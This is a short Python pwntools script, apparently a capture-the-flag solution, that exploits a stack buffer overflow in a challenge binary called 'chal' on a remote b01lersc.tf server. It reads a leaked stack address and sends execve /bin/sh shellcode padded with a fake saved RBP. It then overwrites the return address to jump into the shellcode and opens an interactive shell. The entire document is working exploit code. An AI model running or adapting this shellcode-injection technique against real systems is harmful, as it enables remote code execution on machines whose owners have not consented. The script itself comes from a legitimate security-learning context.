from pwn import *

context.binary = elf = ELF('./chal')

# pr = process()
pr = remote('where.harkonnen.b01lersc.tf',8443,ssl=True)
pr.recvuntil(b'fun... ')
leak = pr.recvline().strip()
leak = int(leak, 16)
payload = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
payload += b'a'*(0x20-len(payload))
payload += b'SAVEDRBP'
payload += p64(leak+8)
pr.sendline(payload)
pr.interactive()
# print(pr.recv())